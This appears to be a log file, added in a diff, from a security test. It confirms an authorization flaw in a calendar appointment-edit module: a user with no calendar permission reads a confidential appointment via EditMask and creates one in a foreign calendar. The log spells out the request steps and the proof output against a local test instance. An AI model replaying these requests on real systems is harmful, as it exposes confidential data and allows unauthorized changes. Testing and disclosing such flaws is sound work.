@@ -1,0 +1,13 @@
+==========================================================================
+VULN-010: AgentAppointmentEdit missing calendar authorization
+Target: http://localhost:25114
+[INFO] EditMask fetches but never enforces CalendarPermissionGet (pm:169-172); create skips it (pm:1082)
+==========================================================================
+[SETUP] foreign calendar id=8 (group calgrp010_74c7df70) with confidential appointment id=7
+[PROOF] attacker CalendarPermissionGet on foreign calendar 8 = '' (empty = no access)
+[STEP] attacker POST EditMask AppointmentID=7 (foreign calendar)
+[PROOF] confidential appointment title 'CONFIDENTIAL-APPT-74c7df70' disclosed to attacker: True
+[STEP] attacker POST EditAppointment create in foreign calendar 8 (no AppointmentID)
+[PROOF] attacker-created appointment in foreign calendar: [['8', 'INJECTED-74c7df70']]
+[OK] exploit confirmed — attacker (no permission on calendar 8) READ a confidential appointment via EditMask AND CREATED a new appointment in that foreign calendar — CalendarPermissionGet is fetched but never enforced.
+==> VULN-010: CONFIRMED — attacker (no permission on calendar 8) READ a confidential appointment via EditMask AND CREATED a new appointment in that foreign calendar — CalendarPermissionGet is fetched but never enforced.
